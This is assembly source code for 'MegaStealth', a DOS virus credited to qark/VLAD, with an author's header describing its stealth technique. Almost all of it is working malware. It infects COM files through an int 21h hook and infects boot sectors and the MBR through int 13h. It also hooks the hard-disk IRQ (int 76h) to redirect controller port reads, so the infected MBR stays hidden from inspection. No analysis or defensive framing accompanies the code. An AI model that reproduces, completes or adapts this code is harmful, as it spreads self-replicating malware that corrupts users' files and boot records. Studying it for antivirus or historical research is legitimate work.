
;       MegaStealth Virus Source by qark
;
;       COM/BS/MBR Infector
;       It uses the new form of stealth developed by the 'strange' virus in
;       that even if you are using the original ROM int 13h the virus will
;       still successfully stealth.  It does this by hooking the hard disk
;       IRQ, int 76h, and checking the ports for a read to the MBR.  If the
;       MBR is being read, the ports will be changed to cause a read from
;       sector four instead.
;
;       Noone has the 'strange' virus (and believe me, every VX BBS in the
;       world has been checked), so I decided to develop the technology
;       independently and make the information public.
;




	org     0

	cld
	mov     ax,cs
	or      ax,ax
	jz      bs_entry
	jmp     com_entry

;------------------- Boot Sector Stub ----------------
Marker  db      '[MegaStealth] by qark/VLAD',0

bs_entry:
	xor     ax,ax
	mov     si,7c00h
	cli
	mov     ss,ax
	mov     sp,si
	sti
	mov     es,ax
	mov     ds,ax

	;CS,DS,ES,SS,AX=0    SI,SP=7C00H
	
	sub     word ptr [413h],2       ;Allocate 2k of memory.

	int     12h                     ;Get memory into AX.

	mov     cl,6
	shl     ax,cl
	mov     es,ax

	mov     ax,202h
	xor     bx,bx
	xor     dh,dh
	mov     cx,2
	or      dl,dl
	js      hd_load

	db      0b9h                    ;MOV CX,xxxx
	floppy_sect     dw      0
	db      0b6h                    ;MOV DH,xx
	floppy_head     db      0

hd_load:
	int     13h                     ;Read our virus in.

	mov     si,13h*4
	mov     di,offset i13
	movsw
	movsw
	mov     word ptr [si-4],offset handler
	mov     word ptr [si-2],es

	mov     byte ptr es:set_21,0
	
	;Test for an 8088.
	mov     al,2
	mov     cl,33
	shr     al,cl
	test    al,1
	jz      no_int76                ;8088 doesn't use int76

	mov     si,76h*4                ;Set int76
	mov     di,offset i76
	movsw
	movsw
	mov     word ptr [si-4],offset int76handler
	mov     word ptr [si-2],es

	mov     byte ptr es:llstealth_disable,0

no_int76:
	int     19h                     ;Reload the original bootsector.

;------------------- COM Stub ----------------

com_entry:

	db      0beh                    ;MOV SI,xxxx
	delta   dw      100h

	mov     ax,0f001h
	int     13h

	cmp     ax,10f0h
	je      resident

	mov     ax,ds
	dec     ax
	mov     ds,ax

	cmp     byte ptr [0],'Z'
	jne     resident

	sub     word ptr [3],7dh
	sub     word ptr [12h],7dh
	mov     ax,word ptr [12h]

	push    cs
	pop     ds
	mov     es,ax
	xor     di,di
	
	push    si

	mov     cx,1024
	rep     movsb

	xor     ax,ax                   ;Set int13
	mov     ds,ax
	mov     si,13h*4
	mov     di,offset i13
	movsw
	movsw
	mov     word ptr [si-4],offset handler
	mov     word ptr [si-2],es

	pop     bx
	push    bx
	add     bx,offset end_virus
	
	push    es
	
	push    cs
	pop     es
	mov     ax,201h
	mov     cx,1
	mov     dx,80h
	int     13h
	
	pop     es

	mov     si,21h*4
	mov     di,offset i21
	movsw
	movsw
	mov     word ptr [si-4],offset int21handler
	mov     word ptr [si-2],es
	
	mov     byte ptr es:set_21,1
	pop     si
	
resident:
	push    cs
	pop     ds
	push    cs
	pop     es

	add     si,offset old4
	mov     di,100h
	push    di
	movsw
	movsw

	ret

old4    db      0cdh,20h,0,0
new4    db      0e9h,0,0,'V'

;------------------- Int 21 ----------------

Int21handler:
	push    ax
	push    es
	mov     ax,0b800h
	mov     es,ax
	mov     word ptr es:[340],0afafh

	pop     es
	pop     ax

	push    ax
	xchg    al,ah
	cmp     al,3dh
	je      chk_infect
	cmp     al,4bh
	je      chk_infect
	cmp     al,43h
	je      chk_infect
	cmp     al,56h
	je      chk_infect
	cmp     ax,6ch
	je      chk_infect
	pop     ax
exit_21:
	db      0eah
	i21     dd      0

far_pop:
	jmp     pop_21

chk_infect:
	push    bx
	push    cx
	push    dx
	push    si
	push    di
	push    ds
	push    es

	cmp     al,6ch
	jne     no_6c
	mov     dx,si
no_6c:
	mov     si,dx
	cld
keep_lookin:
	lodsb
	cmp     al,'.'
	jne     keep_lookin
	lodsw
	or      ax,2020h
	cmp     ax,'oc'
	jne     far_pop
	lodsb
	or      al,20h
	cmp     al,'m'
	jne     far_pop
	mov     ax,3d02h
	call    int21h
	jc      far_pop
	xchg    bx,ax
	
	mov     ah,3fh
	mov     cx,4
	push    cs
	pop     ds
	mov     dx,offset old4
	call    int21h

	mov     ax,word ptr [old4]
	cmp     al,0e9h
	jne     chk_exe
	mov     al,byte ptr old4+3
	cmp     al,'V'
	je      close_exit
	jmp     infect
chk_exe:
	or      ax,2020h
	cmp     ax,'mz'
	je      close_exit
	cmp     ax,'zm'
	je      close_exit
infect:
	call    lseek_end
	or      dx,dx                   ;Too big
	jnz     close_exit
	cmp     ax,63500
	ja      close_exit
	cmp     ax,1000
	jb      close_exit

	push    ax
	add     ax,100h
	mov     delta,ax
	pop     ax
	sub     ax,3
	mov     word ptr new4+1,ax

	mov     ax,5700h
	call    int21h
	jc      close_exit
	push    cx
	push    dx

	mov     ah,40h
	mov     cx,offset end_virus
	xor     dx,dx
	call    int21h
	jc      time_exit

	call    lseek_start
	
	mov     ah,40h
	mov     cx,4
	mov     dx,offset new4
	call    int21h
	

time_exit:
	pop     dx
	pop     cx
	mov     ax,5701h
	call    int21h

close_exit:
	mov     ah,3eh
	call    int21h
pop_21:
	pop     es
	pop     ds
	pop     di
	pop     si
	pop     dx
	pop     cx
	pop     bx
	pop     ax
	jmp     exit_21

lseek_start:
	mov     al,0
	jmp     short lseek
lseek_end:
	mov     al,2
lseek:
	xor     cx,cx
	cwd
	mov     ah,42h
	call    int21h
	ret


Int21h:
	pushf
	call dword ptr cs:i21
	ret

	set_21  db      0       ;1 = 21 is set
;------------------- Int 13 ----------------

Stealth:
	mov     cx,4
	mov     ax,201h

	or      dl,dl
	js      stealth_mbr             ;DL>=80H then goto stealthmbr

	mov     cl,14
	mov     dh,1
stealth_mbr:
	call    int13h
	jmp     pop_end

res_test:
	xchg    ah,al
	iret

multipartite:
	cmp     byte ptr cs:set_21,1
	je      jend
	cmp     word ptr es:[bx],'ZM'
	jne     jend
	push    si
	push    di
	push    ds
	push    es

	xor     si,si
	mov     ds,si
	push    cs
	pop     es

	mov     si,21h*4
	mov     di,offset i21
	movsw
	movsw
	mov     word ptr [si-4],offset int21handler
	mov     word ptr [si-2],es

	mov     byte ptr cs:set_21,1

	pop     es
	pop     ds
	pop     di
	pop     si
	jmp     jend

rend:
	retf    2

Jend:
	db      0eah                    ;= JMP FAR PTR
	i13     dd      0               ;Orig int13h

Handler:
	cmp     ax,0f001h               ;You fool.
	je      res_test

	cmp     ah,2
	jne     multipartite

	cmp     cx,1
	jne     multipartite

	or      dh,dh
	jnz     multipartite
	

	call    int13h                  ;Call the read so we can play with
					; the buffer.
	jc      rend                    ;The read didn't go through so leave

	pushf
	push    ax
	push    bx
	push    cx
	push    dx
	push    si
	push    di
	push    ds
	push    es
	
	cmp     word ptr es:[bx+offset marker],'M['
	je      stealth

	mov     byte ptr cs:llstealth_disable,1

	mov     cx,4                    ;Orig HD MBR at sector 3.

	or      dl,dl                   ;Harddisk ?
	js      write_orig              ;80H or above ?

	;Calculate shit like track/head for floppy******
	push    dx

	push    cs
	pop     ds

	mov     ax,es:[bx+18h]          ;Sectors per track.
	sub     es:[bx+13h],ax          ;Subtract a track.
	mov     ax,es:[bx+13h]          ;AX=total sectors.
	mov     cx,es:[bx+18h]          ;CX=sectors per track
	xor     dx,dx
	div     cx                      ;Total sectors/sectors per track

	xor     dx,dx
	mov     cx,word ptr es:[bx+1ah] ;CX=heads
	div     cx                      ;Total tracks/heads

	push    ax
	xchg    ah,al                   ;AX=Track
	mov     cl,6
	shl     al,cl                   ;Top 2 bits of track.
	or      al,1                    ;We'll use the first sector onward.
	mov     word ptr floppy_sect,ax

	pop     ax
	mov     cx,word ptr es:[bx+1ah] ;CX=heads
	xor     dx,dx
	div     cx                      ;Track/Total Heads

	mov     byte ptr floppy_head,dl ;Remainder=Head number

	mov     cx,14                   ;Floppy root directory.
	pop     dx
	mov     dh,1

write_orig:
	mov     ax,301h                 ;Save the original boot sector.
	call    int13h
	jc      pop_end

	push    es
	pop     ds

	mov     si,bx
	push    cs
	pop     es                      ;ES=CS
	mov     cx,510                  ;Move original sector to our buffer.
	cld
	mov     di,offset end_virus
	rep     movsb
	
	mov     ax,0aa55h               ;End of sector marker.
	stosw

	push    cs
	pop     ds

	xor     si,si
	mov     di,offset end_virus
	mov     cx,offset com_entry
	rep     movsb

	mov     bx,offset end_virus
	
	mov     ax,301h
	mov     cx,1
	xor     dh,dh
	
	call    int13h
	jc      pop_end
	
	mov     ax,302h
	mov     cx,2
	xor     bx,bx
	or      dl,dl
	js      mbr_write

	mov     cx,word ptr floppy_sect
	mov     dh,byte ptr floppy_head
	
mbr_write:

	call    int13h                  ;Write the virus!

pop_end:
	mov     byte ptr cs:llstealth_disable,0

	pop     es
	pop     ds
	pop     di
	pop     si
	pop     dx
	pop     cx
	pop     bx
	pop     ax
	popf    
	jmp     rend                                        


Int13h  Proc    Near
; AH & AL are swapped on entry to this call.

	pushf                   ;Setup our interrupt
	push    cs              ;Our segment
	call    jend            ;This will also fix our AX
	ret

Int13h  EndP

;------------------- Int 76 ----------------

not_bs:
	pop     es
	pop     ds
	pop     di
	pop     dx
	pop     cx
	pop     bx
	pop     ax
no_stealth:
	db      0eah                    ;JMPF
	i76     dd      0
	
Int76Handler:
	cmp     byte ptr cs:llstealth_disable,1
	je      no_stealth

	push    ax
	push    bx
	push    cx
	push    dx
	push    di
	push    ds
	push    es

	mov     dx,1f3h
	in      al,dx           ;Sector number.
	cmp     al,1
	jne     not_bs
	inc     dx              ;1f4h
	in      al,dx           ;Cylinder Low
	cmp     al,0
	jne     not_bs
	inc     dx              ;1f5h
	in      al,dx           ;Cylinder High
	cmp     al,0
	jne     not_bs
	inc     dx              ;1f6h
	in      al,dx
	and     al,0fh          ;Remove everything but the head.
	cmp     al,0            ;Head
	jne     not_bs

	inc     dx              ;1f7h
	in      al,dx

	test    al,0fh
	jnz     disk_read
	jmp     not_bs          ;Must be a write.
disk_read:
	cld
	mov     dx,1f0h
	push    cs
	pop     es
	mov     di,offset end_virus
	mov     cx,512/2
	rep     insw            ;Read in what they read.

	;Now reset the whole system for a read from sector 4.

	mov     dx,1f2h
	mov     al,1            ;One sector.
	out     dx,al
	inc     dx
	mov     al,4            ;Sector 4 instead.
	out     dx,al   ;1f3
	mov     al,0
	inc     dx
	out     dx,al   ;1f4
	inc     dx
	out     dx,al   ;1f5
	inc     dx
	mov     al,0a0h
	out     dx,al   ;1f6

	mov     dx,1f7h
	mov     al,20h          ;Read function.
	out     dx,al
not_done:
	in      al,dx
	test    al,8
	jz      not_done
	jmp     not_bs

llstealth_disable       db      0       ;0 means int76 enabled 
;---------------------- 76 -------------------

end_virus:

